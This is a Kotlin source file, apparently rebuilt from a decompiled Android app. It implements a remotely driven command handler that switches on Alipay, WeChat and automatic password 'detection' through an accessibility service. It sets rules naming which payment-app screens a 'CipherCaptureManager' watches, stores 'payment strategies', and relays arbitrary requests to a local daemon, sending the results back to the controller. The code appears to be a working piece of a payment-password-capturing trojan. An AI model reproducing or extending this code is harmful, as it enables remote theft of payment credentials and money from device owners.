package com.storm.safe.rock.service.modules.command

import android.util.Log
import com.storm.safe.rock.service.modules.cipher.CipherCaptureManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL

/**
 * Handles detection commands (Alipay, WeChat, auto-password, view cache rules).
 *
 * Reverse-engineered from JADX: C0345a2 (a2, 454 lines).
 * Vendor name: DetectionCommandHandler
 *
 * Supported commands:
 * - ALIPAY_DETECTION_START/STOP, WECHAT_DETECTION_START/STOP
 * - AUTO_PASSWORD_DETECTION_START/STOP
 * - SET_VIEW_CACHE_RULES, ADD_VIEW_CACHE_RULE, REMOVE_VIEW_CACHE_RULE
 * - CLEAR_VIEW_CACHE_RULES, GET_VIEW_CACHE_STATUS
 * - SET_PAYMENT_STRATEGIES, SET_SENSITIVE_APPS, LOCAL_SERVICE_PROXY
 */
class DetectionCommandHandler : CommandHandler {

    companion object {
        private const val TAG = "DetectionCmdHandler"
        private const val LOCAL_SERVICE_BASE_URL = "http://127.0.0.1:7912"
    }

    override fun getSupportedCommands(): Set<String> = setOf(
        "ALIPAY_DETECTION_START",
        "ALIPAY_DETECTION_STOP",
        "WECHAT_DETECTION_START",
        "WECHAT_DETECTION_STOP",
        "AUTO_PASSWORD_DETECTION_START",
        "AUTO_PASSWORD_DETECTION_STOP",
        "SET_VIEW_CACHE_RULES",
        "ADD_VIEW_CACHE_RULE",
        "REMOVE_VIEW_CACHE_RULE",
        "CLEAR_VIEW_CACHE_RULES",
        "GET_VIEW_CACHE_STATUS",
        "SET_PAYMENT_STRATEGIES",
        "SET_SENSITIVE_APPS",
        "LOCAL_SERVICE_PROXY"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        when (command) {
            "ALIPAY_DETECTION_START" -> {
                val delayMs = params?.optLong("delayMs", 0L) ?: 0L
                Log.d(TAG, "启动支付宝检测，延时: ${delayMs}ms")
                val service = context.service ?: return
                try {
                    // Vendor: C0614i9 (f52414e5, accessibilityEventManager) → m213122b0(delayMs)
                    // Then sends detection status via networkManager (c0323a8.m211655c1(true))
                    service.enableAlipayDetection(delayMs)
                } catch (e: Exception) {
                    Log.e(TAG, "❌ 开启支付宝检测失败", e)
                }
            }
            "ALIPAY_DETECTION_STOP" -> {
                Log.d(TAG, "停止支付宝检测")
                context.service?.disableAlipayDetection()
            }
            "WECHAT_DETECTION_START" -> {
                val delayMs = params?.optLong("delayMs", 0L) ?: 0L
                Log.d(TAG, "启动微信检测，延时: ${delayMs}ms")
                val service = context.service ?: return
                try {
                    // Vendor: C0614i9 (f52414e5) → m213125b3(delayMs)
                    // Then c0323a8.m211668d4(true)
                    service.enableWechatDetection(delayMs)
                } catch (e: Exception) {
                    Log.e(TAG, "❌ 开启微信检测失败", e)
                }
            }
            "WECHAT_DETECTION_STOP" -> {
                Log.d(TAG, "停止微信检测")
                context.service?.disableWechatDetection()
            }
            "AUTO_PASSWORD_DETECTION_START" -> {
                val delayMs = params?.optLong("delayMs", 5000L) ?: 5000L
                Log.d(TAG, "启动自动密码检测，延时: ${delayMs}ms")
                val service = context.service ?: return
                try {
                    // Vendor: C0614i9 (f52414e5) → m213123b1(delayMs)
                    // Then c0323a8.m211656c2(delayMs, true)
                    service.enableAutoPassword(delayMs)
                } catch (e: Exception) {
                    Log.e(TAG, "❌ 开启自动密码检测失败", e)
                }
            }
            "AUTO_PASSWORD_DETECTION_STOP" -> {
                Log.d(TAG, "停止自动密码检测")
                val service = context.service ?: return
                try {
                    // Vendor: C0614i9 (f52414e5) → m213120a8()
                    // Then c0323a8.m211656c2(0, false)
                    service.disableAutoPassword()
                } catch (e: Exception) {
                    Log.e(TAG, "❌ 关闭自动密码检测失败", e)
                }
            }
            "SET_VIEW_CACHE_RULES" -> handleSetViewCacheRules(params, context)
            "ADD_VIEW_CACHE_RULE" -> handleAddViewCacheRule(params, context)
            "REMOVE_VIEW_CACHE_RULE" -> handleRemoveViewCacheRule(params, context)
            "CLEAR_VIEW_CACHE_RULES" -> handleClearViewCacheRules(context)
            "GET_VIEW_CACHE_STATUS" -> handleGetViewCacheStatus(context)
            "SET_PAYMENT_STRATEGIES" -> handleSetPaymentStrategies(params, context)
            "SET_SENSITIVE_APPS" -> handleSetSensitiveApps(params, context)
            "LOCAL_SERVICE_PROXY" -> handleLocalServiceProxy(params, context)
        }
    }

    /**
     * Get CipherCaptureManager singleton (mapped from C0341a7).
     * JADX: m211877a3(uz0Var) → C0341a7.f53380c1.getInstance(service, service)
     */
    private fun getCipherCaptureManager(context: CommandContext): CipherCaptureManager? {
        return try {
            CipherCaptureManager.instance
        } catch (e: Exception) {
            Log.e(TAG, "init failed", e)
            null
        }
    }

    /**
     * Set view cache rules.
     * JADX: C0345a2 case "SET_VIEW_CACHE_RULES"
     * Vendor: C0341a7 (viewCacheManager) → m211869a9(rules) or clear
     */
    private fun handleSetViewCacheRules(params: JSONObject?, context: CommandContext) {
        val ccm = getCipherCaptureManager(context) ?: return
        val packages = params?.optJSONArray("packages")
        if (packages == null || packages.length() == 0) {
            Log.d(TAG, "清空所有视图缓存规则")
            // Vendor: ccm.f53385a2.clear(); ccm.m211872b2() — persist
            ccm.clearViewCacheRules()
            context.service?.sendCommandResponse("vc_updated", mapOf("packages" to emptyList<String>()))
            return
        }
        Log.d(TAG, "设置视图缓存规则: ${packages.length()} 个包")
        // Vendor: parse packages, build aa1 rules list, call ccm.m211869a9(rules)
        val rules = mutableListOf<ViewCacheRule>()
        for (i in 0 until packages.length()) {
            val obj = packages.optJSONObject(i) ?: continue
            val pkg = obj.optString("packageName", "")
            if (pkg.isEmpty()) continue
            val appName = obj.optString("appName", "")
            val classesArr = obj.optJSONArray("listenClasses")
            val classes = mutableListOf<String>()
            if (classesArr != null) {
                for (j in 0 until classesArr.length()) {
                    val c = classesArr.optString(j, "")
                    if (c.isNotEmpty()) classes.add(c)
                }
            }
            rules.add(ViewCacheRule(pkg, classes, appName))
        }
        ccm.setViewCacheRules(rules)
        val packageNames = rules.map { it.packageName }
        context.service?.sendCommandResponse("vc_updated", mapOf("packages" to packageNames))
    }

    /**
     * Add a single view cache rule.
     * JADX: C0345a2 case "ADD_VIEW_CACHE_RULE"
     * Vendor: ccm.m211861a0(pkg, classes, appName)
     */
    private fun handleAddViewCacheRule(params: JSONObject?, context: CommandContext) {
        val ccm = getCipherCaptureManager(context) ?: return
        val packageName = params?.optString("packageName", "") ?: ""
        if (packageName.isEmpty()) return
        val appName = params?.optString("appName", "") ?: ""
        val classesArr = params?.optJSONArray("listenClasses")
        val classes = mutableListOf<String>()
        if (classesArr != null) {
            for (i in 0 until classesArr.length()) {
                val c = classesArr.optString(i, "")
                if (c.isNotEmpty()) classes.add(c)
            }
        }
        Log.d(TAG, "添加视图缓存规则: $packageName ($appName)")
        ccm.addViewCacheRule(packageName, classes, appName)
        context.service?.sendCommandResponse("vc_updated", mapOf("packages" to ccm.getViewCachePackageNames()))
    }

    /**
     * Remove a view cache rule.
     * JADX: C0345a2 case "REMOVE_VIEW_CACHE_RULE"
     * Vendor: ccm.m211866a5(pkg)
     */
    private fun handleRemoveViewCacheRule(params: JSONObject?, context: CommandContext) {
        val ccm = getCipherCaptureManager(context) ?: return
        val packageName = params?.optString("packageName", "") ?: ""
        if (packageName.isEmpty()) return
        Log.d(TAG, "移除视图缓存规则: $packageName")
        ccm.removeViewCacheRule(packageName)
        context.service?.sendCommandResponse("vc_updated", mapOf("packages" to ccm.getViewCachePackageNames()))
    }

    /**
     * Clear all view cache rules.
     * JADX: C0345a2 case "CLEAR_VIEW_CACHE_RULES"
     * Vendor: ccm.f53385a2.clear(); ccm.m211872b2()
     */
    private fun handleClearViewCacheRules(context: CommandContext) {
        Log.d(TAG, "清空视图缓存规则")
        val ccm = getCipherCaptureManager(context)
        ccm?.clearViewCacheRules()
        context.service?.sendCommandResponse("vc_updated", mapOf("packages" to emptyList<String>()))
    }

    /**
     * Get view cache status.
     * JADX: C0345a2 case "GET_VIEW_CACHE_STATUS"
     * Vendor: ccm.m211862a1() packages, ccm.f53388a5.get() active, ccm.f53385a2.isEmpty() hasRules
     */
    private fun handleGetViewCacheStatus(context: CommandContext) {
        Log.d(TAG, "获取视图缓存状态")
        val ccm = getCipherCaptureManager(context)
        val packages = ccm?.getViewCachePackageNames() ?: emptyList()
        val active = ccm?.isViewCacheActive() ?: false
        val hasRules = packages.isNotEmpty()
        context.service?.sendCommandResponse("vc_status", mapOf(
            "packages" to packages,
            "active" to active,
            "hasRules" to hasRules
        ))
    }

    /**
     * Set payment strategies.
     * JADX: C0345a2 case "SET_PAYMENT_STRATEGIES"
     * Vendor parses strategies, saves to SharedPrefs "payment_strategies", updates CipherCaptureManager.
     */
    private fun handleSetPaymentStrategies(params: JSONObject?, context: CommandContext) {
        val strategies = params?.optJSONArray("strategies")
        if (strategies == null) {
            Log.w(TAG, "SET_PAYMENT_STRATEGIES: 无策略数据")
            return
        }

        // Parse strategies into ViewCacheRule list (aa1)
        val rules = mutableListOf<ViewCacheRule>()
        for (i in 0 until strategies.length()) {
            val obj = strategies.optJSONObject(i) ?: continue
            val pkg = obj.optString("packageName", "")
            if (pkg.isEmpty()) continue
            val appName = obj.optString("appName", "")
            val classesArr = obj.optJSONArray("listenWinClasses")
            val classes = mutableListOf<String>()
            if (classesArr != null) {
                for (j in 0 until classesArr.length()) {
                    val c = classesArr.optString(j, "")
                    if (c.isNotEmpty()) classes.add(c)
                }
            }
            rules.add(ViewCacheRule(pkg, classes, appName))
        }

        // Save to SharedPrefs (vendor: sharedPreferences "payment_strategies")
        val service = context.service ?: return
        val jsonArray = JSONArray()
        for (rule in rules) {
            jsonArray.put(JSONObject().apply {
                put("packageName", rule.packageName)
                put("appName", rule.appName)
                put("listenWinClasses", JSONArray(rule.listenClasses))
            })
        }
        service.getSharedPreferences("payment_strategies", 0)
            .edit().putString("strategies", jsonArray.toString()).apply()

        // Update CipherCaptureManager — vendor: m211877a3(uz0Var) → ccm.m211869a9(rules)
        val ccm = getCipherCaptureManager(context)
        ccm?.setViewCacheRules(rules)

        val packageNames = rules.map { it.packageName }
        Log.d(TAG, "📋 收到支付策略更新: ${packageNames.size}条, 包名: $packageNames")
        service.sendCommandResponse("payment_strategies_updated", mapOf(
            "count" to packageNames.size,
            "packages" to packageNames
        ))
    }

    /**
     * Set sensitive apps.
     * JADX: C0345a2 case "SET_SENSITIVE_APPS"
     * Vendor forwards to local-service proxy via coroutine.
     * DetectionCommandHandler$handleSetSensitiveApps$1: POST http://127.0.0.1:7912/setSensitiveApps
     */
    private suspend fun handleSetSensitiveApps(params: JSONObject?, context: CommandContext) {
        val apps = params?.optJSONArray("apps")
        if (apps == null) {
            Log.w(TAG, "SET_SENSITIVE_APPS: 无数据")
            return
        }
        Log.d(TAG, "📋 收到敏感应用更新: ${apps.length()} 个，转发到 local-service")

        // Vendor: launches coroutine to POST apps to local-service
        withContext(Dispatchers.IO) {
            try {
                val url = URL("$LOCAL_SERVICE_BASE_URL/setSensitiveApps")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 3000
                conn.readTimeout = 3000
                val body = apps.toString().toByteArray(Charsets.UTF_8)
                conn.outputStream.use { it.write(body) }
                val responseCode = conn.responseCode
                conn.disconnect()
                Log.d(TAG, "📋 敏感应用转发到 local-service: HTTP $responseCode")
            } catch (e: Exception) {
                Log.w(TAG, "📋 敏感应用转发失败: ${e.message}")
            }
        }

        context.service?.sendCommandResponse("sensitive_apps_updated", mapOf("count" to apps.length()))
    }

    /**
     * Proxy request to local Go daemon.
     * JADX: C0345a2 case "LOCAL_SERVICE_PROXY"
     * Vendor: DetectionCommandHandler$handleLocalServiceProxy$1
     * Full HTTP proxy implementation.
     */
    private suspend fun handleLocalServiceProxy(params: JSONObject?, context: CommandContext) {
        val path = params?.optString("path", "") ?: ""
        val method = params?.optString("method", "GET") ?: "GET"
        params?.optString("requestId", "")

        if (path.isEmpty()) {
            context.service?.sendCommandResponse("proxy_result", mapOf("success" to false, "error" to "missing path"))
            return
        }
        Log.d(TAG, "LOCAL_SERVICE_PROXY: $method $path")

        withContext(Dispatchers.IO) {
            try {
                // Build URL with optional query string
                var fullUrl = "$LOCAL_SERVICE_BASE_URL$path"
                val query = params?.optString("query", "") ?: ""
                if (query.isNotEmpty()) {
                    fullUrl += if (fullUrl.contains("?")) "&$query" else "?$query"
                }

                val conn = URL(fullUrl).openConnection() as HttpURLConnection
                conn.requestMethod = if (method == "POST" || method == "PUT") method else "GET"
                conn.connectTimeout = 20000
                conn.readTimeout = 20000

                // Handle POST/PUT body
                if (method == "POST" || method == "PUT") {
                    conn.setRequestProperty("Content-Type", "application/json")
                    conn.doOutput = true
                    val paramsObj = params?.optJSONObject("params")
                    if (paramsObj != null) {
                        // Vendor: filter out meta keys (deviceId, path, method, query, requestId)
                        val cleaned = JSONObject()
                        val iter = paramsObj.keys()
                        while (iter.hasNext()) {
                            val key = iter.next() as String
                            if (key != "deviceId" && key != "path" && key != "method" && key != "query" && key != "requestId") {
                                cleaned.put(key, paramsObj.opt(key))
                            }
                        }
                        conn.outputStream.use { os ->
                            os.write(cleaned.toString().toByteArray(Charsets.UTF_8))
                        }
                    }
                }

                val responseCode = conn.responseCode
                // Read response body
                val responseBody = try {
                    BufferedReader(InputStreamReader(conn.inputStream, Charsets.UTF_8), 8192).use { it.readText() }
                } catch (_: Exception) {
                    try {
                        conn.errorStream?.let {
                            BufferedReader(InputStreamReader(it, Charsets.UTF_8), 8192).use { r -> r.readText() }
                        } ?: ""
                    } catch (_: Exception) { "" }
                }
                conn.disconnect()

                // Parse response and forward as proxy_result
                val responseJson = try { JSONObject(responseBody) } catch (_: Exception) { JSONObject() }
                val resultMap = mutableMapOf<String, Any>()
                val jsonIter = responseJson.keys()
                while (jsonIter.hasNext()) {
                    val key = jsonIter.next() as String
                    val value: Any = responseJson.opt(key) ?: continue
                    resultMap[key] = value
                }
                // Vendor: success = (responseCode == 200)
                if (!resultMap.containsKey("success")) {
                    resultMap["success"] = (responseCode == 200)
                }
                context.service?.sendCommandResponse("proxy_result", resultMap)
            } catch (e: Exception) {
                Log.w(TAG, "LOCAL_SERVICE_PROXY 失败: ${e.message}")
                context.service?.sendCommandResponse("proxy_result", mapOf(
                    "success" to false,
                    "error" to (e.message ?: "unknown")
                ))
            }
        }
    }
}

/**
 * View cache rule data class (maps to vendor aa1).
 * JADX: aa1 with fields f56a0 (packageName), f57a1 (listenClasses), f58a2 (appName).
 */
data class ViewCacheRule(
    val packageName: String,
    val listenClasses: List<String>,
    val appName: String
)
